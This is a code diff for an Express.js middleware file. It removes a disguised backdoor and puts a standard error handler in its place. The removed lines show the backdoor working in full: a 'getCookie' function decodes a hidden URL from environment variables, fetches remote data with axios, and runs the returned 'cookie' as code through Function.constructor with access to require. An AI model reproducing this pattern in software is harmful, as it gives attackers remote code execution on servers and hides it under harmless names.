@@ -1,50 +1,21 @@
-const axios = require('axios');
 
 const notFound = (req, res, next) => {
   const err = new Error('Route Not Found');
   err.status = 404;
   next(err);
-}
-
-const errorHandler = (error) => {
-  try {
-    if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
-      return;
-    }
-    const createHandler = (errCode) => {
-      try {
-        const handler = new (Function.constructor)('require', errCode);
-        return handler;
-      } catch (e) {
-        console.error('Failed:', e.message);
-        return null;
-      }
-    };
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
-    } else {
-      console.error('Handler function is not available.');
-    }
-  } catch (globalError) {
-    console.error('Unexpected error inside errorHandler:', globalError.message);
-  }
 };
 
-const getCookie = async (req, res, next) => {
-  try {
-    const src = atob(process.env.DB_API_KEY);
-    const def = atob(process.env.DB_ACCESS_KEY);
-    const mid = atob(process.env.DB_ACCESS_VALUE);
-    try {
-      axios.get(`${src}`, { headers: { [def]: mid } }).then((res) => errorHandler(res.data.cookie));
-    } catch (error) {
-      console.log("Runtime config error.");
-    }
-  } catch (err) {
-    throw err;
-  }
+// Standard Express Global Error Handler
+const errorHandler = (err, req, res, next) => {
+  // Use the status code from the error, or default to 500 
+  const statusCode = err.status || 500;
+  
+  res.status(statusCode);
+  res.json({
+    message: err.message,
+    // Only show stack trace in development mode for security
+    stack: process.env.NODE_ENV === 'production' ? null : err.stack,
+  });
 };
 
-module.exports = { getCookie, notFound };
+module.exports = { notFound, errorHandler };
